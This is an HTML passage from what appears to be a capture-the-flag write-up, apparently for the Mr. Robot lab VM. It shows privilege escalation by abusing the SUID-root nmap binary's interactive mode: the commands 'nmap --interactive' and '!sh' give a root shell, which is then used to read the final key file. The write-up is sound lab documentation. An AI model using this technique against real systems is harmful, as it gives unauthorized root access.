+<p><font size="3.5" color="black">Older versions of Nmap (2.02 to 5.21) had an interactive mode which allowed users to execute shell commands.  Since Nmap is in the list of binaries that is executed with root privileges it is possible to use the interactive console in order to run a shell with the same privileges:</font></p>
+<pre style="background-color:black;color:white;">
+robot@linux:/tmp$ ls -l /usr/local/bin/nmap
+ls -l /usr/local/bin/nmap
+-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
+robot@linux:/tmp$ /usr/local/bin/nmap -v
+/usr/local/bin/nmap -v
+
+Starting nmap 3.81 ( http://www.insecure.org/nmap/ ) at 2018-10-14 21:48 UTC
+No target machines/networks specified!
+QUITTING!
+robot@linux:/tmp$ /usr/local/bin/nmap --interactive
+/usr/local/bin/nmap --interactive
+
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> !sh
+!sh
+# whoami
+whoami
+root
+# pwd
+pwd
+/tmp
+# cd /;ls
+cd /;ls
+bin   dev  home        lib    lost+found  mnt  proc  run   srv	tmp  var
+boot  etc  initrd.img  lib64  media	  opt  root  sbin  sys	usr  vmlinuz
+# cd root;ls
+cd root;ls
+firstboot_done	key-3-of-3.txt
+# cat key-3-of-3.txt
+cat key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
+</pre>
+
+</div>
+</div>
+
+<div class="about-me-area section-padding-100 clearfix">
+<div class="container-fluid">
+
+
+
+
+
+<!-- ##### All Javascript Files ##### -->
+<!-- jQuery-2.2.4 js -->
+<script src="js/jquery/jquery-2.2.4.min.js"></script>
+<!-- Popper js -->
+<script src="js/bootstrap/popper.min.js"></script>
+<!-- Bootstrap js -->
+<script src="js/bootstrap/bootstrap.min.js"></script>
+<!-- All Plugins js -->
+<script src="js/plugins/plugins.js"></script>
+<!-- Active js -->
+<script src="js/active.js"></script>
+
+</body>
+
+</html>
